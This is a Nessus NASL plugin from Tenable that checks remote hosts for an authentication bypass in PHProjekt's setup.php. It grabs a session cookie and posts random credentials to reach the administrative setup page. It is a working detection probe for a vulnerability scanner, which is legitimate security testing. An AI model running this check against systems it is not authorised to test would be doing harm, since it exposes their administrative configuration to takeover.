#
# This script is (C) Tenable Network Security
# Author: Shruti@tenablesecurity.com
# Ref: Martin M?nch  
#
if(description)
{
 script_id(15905);
 script_version("$Revision: 1.3 $");
 script_bugtraq_id(11797);

 script_name(english:"PHProjekt Unspecified Authentication Bypass Vulnerability");
 desc["english"] = "
The remote host is running PHProjekt, open-source PHP Groupware
package. It runs on most Linux and Unix variants, in addition 
to Microsoft Windows operating systems.

An unspecified authentication bypass vulnerability is present in the 
'setup.php' source file and may be exploited by a remote attacker to gain 
access to the 'setup.php' file without requiring authentication. The 
'setup.php' file may then be employed to make administrative 
configuration changes to the PHPProjekt website.

Solution : Upgrade setup.php to the fixed version - setup.php,v 1.3
Risk factor : High";
 
 script_description(english:desc["english"]);
 script_summary(english:"Uses a form-POST method to enter the configuration page");
 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);



if(get_port_state(port))
{
 req = http_get(item:"/phprojekt/setup.php", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 cookie = egrep(pattern:"^Set-Cookie:", string:res);
 cookie = ereg_replace(pattern:"Set-Cookie", replace:"Cookie", string:cookie);
 cookie = ereg_replace(pattern:"(.*);.*", replace:"\1", string:cookie);

 if (cookie)
 {
  req = http_post(item:"/phprojekt/setup.php", port:port);
  idx = stridx(req, string("\r\n\r\n"));
  data = string("nachname=", rand(), "&admin_pw=", rand());
  req = insstr(req, string("\r\nContent-Type: application/x-www-form-urlencoded\r\n", cookie, "\r\n", 
  "Content-Length: ",strlen(data),"\r\n\r\n",data),idx);


  res = http_keepalive_send_recv(port:port, data:req);
  if( res == NULL ) exit(0);

  if("PHProjekt SETUP" >< res)
  {
   security_hole(port);
   exit(0);
  }
 }
}
